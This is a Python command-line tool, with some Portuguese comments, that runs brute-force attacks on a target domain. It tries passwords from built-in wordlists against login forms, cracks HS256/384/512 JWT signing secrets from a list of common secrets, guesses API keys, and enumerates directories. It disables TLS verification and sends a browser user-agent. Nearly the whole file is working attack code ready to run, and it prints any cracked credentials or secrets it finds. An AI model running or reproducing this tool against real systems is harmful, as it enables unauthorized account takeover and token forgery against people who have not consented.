#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Brute Force — Forca bruta em login, tokens, APIs e headers
"""

import sys
import json
import time
import ssl
import urllib.request
import urllib.error
import hashlib
import hmac
import base64
import re
from typing import Dict, List, Optional, Tuple
from datetime import datetime
from urllib.parse import urlparse, urlencode


class BruteForce:
    """Brute force em diferentes vetores"""

    # Wordlists padrao
    COMMON_PASSWORDS = [
        'password', '123456', '12345678', 'qwerty', 'abc123',
        'monkey', '1234567', 'letmein', 'trustno1', 'dragon',
        'baseball', 'iloveyou', 'master', 'sunshine', 'ashley',
        'bailey', 'shadow', '123123', '654321', 'superman',
        'qazwsx', 'michael', 'football', 'password1', 'password123',
        'admin', 'admin123', 'root', 'toor', 'pass', 'test',
        'guest', 'info', 'mysql', 'postgres', 'oracle',
        'changeme', 'default', 'welcome', 'login', 'secret',
        '1234', '12345', '123456789', '1234567890', '0000',
        'passw0rd', 'p@ssw0rd', 'admin1', 'root123', 'toor123',
    ]

    COMMON_USERNAMES = [
        'admin', 'root', 'user', 'test', 'guest', 'info', 'mysql',
        'postgres', 'oracle', 'admin1', 'administrator', 'webmaster',
        'support', 'sales', 'contact', 'api', 'service',
        'manager', 'operator', 'backup', 'deploy',
    ]

    # JWT secrets comuns
    JWT_SECRETS = [
        'secret', 'password', 'jwt_secret', 'your-256-bit-secret',
        'supersecret', 'changeme', 'test', 'dev', 'production',
        'your_secret_key', 'my_secret', 'jwt', 'token',
        'keyboard cat', 'your-secret', 'secret-key',
        'mysecret', 'secret123', '123456', 'password123',
        'django-insecure', 'SECRET_KEY', 'APP_SECRET',
        'flask_secret', 'SECRET', 'authlib_encrypt_key',
        'jwtSignKey', 'jwt.secret', 'secret123456',
        'your_secret_here', 'CHANGE_ME', 'token123',
        'appsecret', 'api_secret', 'key123',
        'my_jwt_secret', 'your_jwt_secret', 'jwt_secret_key',
    ]

    def __init__(self, target: str, timeout: int = 5, delay: float = 0.1):
        self.target = target.rstrip('/')
        self.base_url = f"https://{target}"
        self.timeout = timeout
        self.delay = delay
        self.ctx = ssl.create_default_context()
        self.ctx.check_hostname = False
        self.ctx.verify_mode = ssl.CERT_NONE
        self.user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        self.results: List[Dict] = []

    def _request(self, url: str, method: str = 'GET', data: dict = None,
                 headers: dict = None) -> Tuple[int, str]:
        """Generic request"""
        try:
            req_headers = {'User-Agent': self.user_agent}
            if headers:
                req_headers.update(headers)

            if method == 'POST' and data:
                body = urlencode(data).encode()
                req_headers['Content-Type'] = 'application/x-www-form-urlencoded'
                req = urllib.request.Request(url, data=body, headers=req_headers, method=method)
            else:
                req = urllib.request.Request(url, headers=req_headers, method=method)

            with urllib.request.urlopen(req, timeout=self.timeout, context=self.ctx) as resp:
                body = resp.read().decode('utf-8', errors='ignore')
                return resp.status, body
        except urllib.error.HTTPError as e:
            body = e.read().decode('utf-8', errors='ignore')[:500] if e.fp else ''
            return e.code, body
        except Exception as e:
            return 0, str(e)

    # ================================================================
    # LOGIN BRUTE FORCE
    # ================================================================

    def brute_login(self, username: str = 'admin', password_list: List[str] = None,
                    login_url: str = None) -> Dict:
        """Brute force em formulario de login"""
        print(f"\n  [BRUTE] Login brute force against {self.base_url}")
        result = {'type': 'Login Brute Force', 'success': False, 'credentials': []}

        url = login_url or f"{self.base_url}/login"
        passwords = password_list or self.COMMON_PASSWORDS

        print(f"    Testing {len(passwords)} passwords for user '{username}'...")

        # Detect form fields
        status, body = self._request(url)
        form_fields = {'username': 'username', 'password': 'password'}

        # Try common field patterns
        name_patterns = [
            (r'name=["\'](user|username|email|login)["\']', 'username'),
            (r'name=["\'](pass|password|pwd|secret)["\']', 'password'),
        ]
        for pattern, field in name_patterns:
            matches = re.findall(pattern, body, re.IGNORECASE)
            if matches:
                form_fields[field] = matches[0]

        for i, password in enumerate(passwords):
            form_data = {
                form_fields['username']: username,
                form_fields['password']: password,
            }

            status, body = self._request(url, method='POST', data=form_data)
            time.sleep(self.delay)

            # Check for success indicators
            success_indicators = [
                'logout', 'dashboard', 'profile', 'welcome', 'signed in',
                'redirect', 'location', '302', 'session',
            ]
            is_success = (
                status == 302 or
                any(ind in body.lower() for ind in success_indicators) or
                (status == 200 and 'login' not in body.lower() and 'password' not in body.lower())
            )

            if is_success:
                finding = {
                    'username': username,
                    'password': password,
                    'url': url,
                    'status': status,
                    'method': 'POST',
                }
                result['credentials'].append(finding)
                result['success'] = True
                print(f"    [FOUND] {username}:{password} -> HTTP {status}")
                break
            else:
                if (i + 1) % 20 == 0:
                    print(f"    Progress: {i+1}/{len(passwords)}...")

        if not result['success']:
            print(f"    [INFO] No credentials found in {len(passwords)} attempts")

        return result

    # ================================================================
    # JWT SECRET BRUTE FORCE
    # ================================================================

    def brute_jwt_secret(self, token: str) -> Dict:
        """Brute force JWT secret key"""
        print(f"\n  [BRUTE] JWT secret brute force")
        result = {'type': 'JWT Secret Brute Force', 'success': False, 'secret': None}

        try:
            parts = token.split('.')
            if len(parts) != 3:
                result['error'] = 'Invalid JWT format'
                return result

            header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
            original_sig = parts[2]
            algo = header.get('alg', 'HS256')

            print(f"    Algorithm: {algo}")
            print(f"    Testing {len(self.JWT_SECRETS)} common secrets...")

            for i, secret in enumerate(self.JWT_SECRETS):
                try:
                    if algo.upper() == 'HS256':
                        computed = hmac.new(
                            secret.encode(),
                            f"{parts[0]}.{parts[1]}".encode(),
                            hashlib.sha256
                        ).digest()
                    elif algo.upper() == 'HS384':
                        computed = hmac.new(
                            secret.encode(),
                            f"{parts[0]}.{parts[1]}".encode(),
                            hashlib.sha384
                        ).digest()
                    elif algo.upper() == 'HS512':
                        computed = hmac.new(
                            secret.encode(),
                            f"{parts[0]}.{parts[1]}".encode(),
                            hashlib.sha512
                        ).digest()
                    else:
                        continue

                    computed_b64 = base64.urlsafe_b64encode(computed).rstrip(b'=').decode()

                    if computed_b64 == original_sig:
                        result['success'] = True
                        result['secret'] = secret
                        result['algorithm'] = algo
                        print(f"    [FOUND] JWT secret: '{secret}'")
                        break
                except Exception:
                    continue

                if (i + 1) % 10 == 0:
                    print(f"    Progress: {i+1}/{len(self.JWT_SECRETS)}...")

        except Exception as e:
            result['error'] = str(e)

        return result

    # ================================================================
    # API KEY BRUTE FORCE
    # ================================================================

    def brute_api_key(self, endpoint: str, key_format: str = 'alpha') -> Dict:
        """Tenta common API keys contra endpoint"""
        print(f"\n  [BRUTE] API key testing against {endpoint}")
        result = {'type': 'API Key Brute Force', 'success': False, 'keys': []}

        # Generate common API key patterns
        test_keys = []
        if key_format == 'alpha':
            test_keys = [
                'test', 'demo', 'public', 'private', 'secret',
                'key', 'api', '1234567890', 'abcdef1234567890',
            ]
        elif key_format == 'uuid':
            import uuid
            test_keys = [str(uuid.uuid4()) for _ in range(5)]
        elif key_format == 'hex':
            test_keys = [hashlib.md5(str(i).encode()).hexdigest() for i in range(10)]

        headers = {
            'User-Agent': self.user_agent,
            'Accept': 'application/json',
        }

        for key in test_keys:
            headers['X-API-Key'] = key
            status, body = self._request(endpoint, headers=headers)

            if status == 200 and body:
                result['keys'].append({'key': key, 'header': 'X-API-Key'})
                result['success'] = True
                print(f"    [FOUND] Valid API key: {key}")
                break
            elif status == 401:
                pass  # Key rejected
            elif status == 403:
                result['keys'].append({'key': key, 'blocked': True})

        if not result['success']:
            print(f"    [INFO] No valid API keys found")

        return result

    # ================================================================
    # DIRECTORY BRUTE FORCE (via wordlist)
    # ================================================================

    def brute_directory(self, wordlist: List[str] = None, concurrent: int = 5) -> Dict:
        """Brute force de diretorios com wordlist customizada"""
        print(f"\n  [BRUTE] Directory brute force")
        words = wordlist or [
            'admin', 'api', 'backup', 'config', 'data', 'db',
            'debug', 'dev', 'docs', 'upload', 'files', 'logs',
            'media', 'public', 'scripts', 'search', 'temp',
            'test', 'tmp', 'vendor', 'www',
        ]

        result = {'type': 'Directory Brute Force', 'found': [], 'tested': len(words)}
        print(f"    Testing {len(words)} directories...")

        for word in words:
            url = f"{self.base_url}/{word}"
            status, _ = self._request(url)

            if status in [200, 301, 302, 403]:
                result['found'].append({
                    'path': f'/{word}',
                    'status': status,
                    'type': 'directory' if word.endswith('/') else 'path',
                })
                icon = "✅" if status == 200 else "🔒" if status == 403 else "🔄"
                print(f"    {icon} /{word} -> {status}")

        print(f"    Found {len(result['found'])} accessible paths")
        return result

    # ================================================================
    # PASSWORD PATTERNS (User-specific)
    # ================================================================

    def generate_password_candidates(self, username: str, company: str = None) -> List[str]:
        """Gera candidatos de senha baseados no usuario"""
        candidates = []
        base_names = [username.lower(), (company or '').lower()]

        for name in base_names:
            if not name:
                continue
            candidates.extend([
                name, f"{name}123", f"{name}!", f"{name}2024",
                f"{name}2025", f"{name}2026", f"Pass{name}123",
                f"Admin{name}", f"{name}@123", f"{name}_2024",
            ])

        candidates.extend(self.COMMON_PASSWORDS)
        return list(set(candidates))

    # ================================================================
    # MAIN BRUTE FORCE PIPELINE
    # ================================================================

    def run_all(self, target_info: Dict = None) -> Dict:
        """Executa todos os testes de brute force"""
        print("\n" + "=" * 70)
        print("  BRUTE FORCE ENGINE")
        print("=" * 70)

        all_results = {
            'target': self.target,
            'timestamp': datetime.now().isoformat(),
            'tests': [],
            'successes': [],
            'summary': {'total_tests': 0, 'successful': 0},
        }

        # 1. Login brute force
        r = self.brute_login()
        all_results['tests'].append(r)
        if r.get('success'):
            all_results['successes'].append(r)
            all_results['summary']['successful'] += 1

        # 2. JWT brute force (se token encontrado)
        tokens = (target_info or {}).get('tokens', {}).get('jwt_tokens', [])
        for tok_info in tokens[:2]:
            r = self.brute_jwt_secret(tok_info.get('token', ''))
            all_results['tests'].append(r)
            if r.get('success'):
                all_results['successes'].append(r)
                all_results['summary']['successful'] += 1
                print(f"  [!!] JWT SECRET CRACKED: {r.get('secret')}")

        # 3. Directory brute force
        r = self.brute_directory()
        all_results['tests'].append(r)
        if r.get('found'):
            all_results['successes'].append(r)
            all_results['summary']['successful'] += 1

        # 4. API key test
        r = self.brute_api_key(f"{self.base_url}/api/v1/config")
        all_results['tests'].append(r)
        if r.get('success'):
            all_results['successes'].append(r)
            all_results['summary']['successful'] += 1

        all_results['summary']['total_tests'] = len(all_results['tests'])

        print("\n" + "=" * 70)
        print(f"  BRUTE FORCE SUMMARY")
        print("=" * 70)
        print(f"  Tests run: {all_results['summary']['total_tests']}")
        print(f"  Successful: {all_results['summary']['successful']}")

        if all_results['successes']:
            print(f"\n  [!!] BRUTE FORCE SUCCESSFUL — Check results for credentials!")
        else:
            print(f"\n  [OK] No brute force successes")

        return all_results


def main():
    import argparse
    parser = argparse.ArgumentParser(description='Brute Force Engine')
    parser.add_argument('target', help='Target domain')
    parser.add_argument('--username', '-u', default='admin', help='Username to test')
    parser.add_argument('--passwords', '-p', help='Custom password list file')
    parser.add_argument('--token', '-t', help='JWT token for secret cracking')
    parser.add_argument('--output', '-o', help='Output JSON file')

    args = parser.parse_args()

    bf = BruteForce(args.target)

    # Load custom password list
    password_list = None
    if args.passwords:
        with open(args.passwords, 'r', encoding='utf-8') as f:
            password_list = [line.strip() for line in f if line.strip()]

    if args.token:
        result = bf.brute_jwt_secret(args.token)
    else:
        result = bf.run_all()

    if args.output:
        with open(args.output, 'w', encoding='utf-8') as f:
            json.dump(result, f, indent=2, ensure_ascii=False, default=str)
        print(f"\n[SAVE] Results saved to {args.output}")
    else:
        print(json.dumps(result, indent=2, ensure_ascii=False, default=str))


if __name__ == "__main__":
    main()
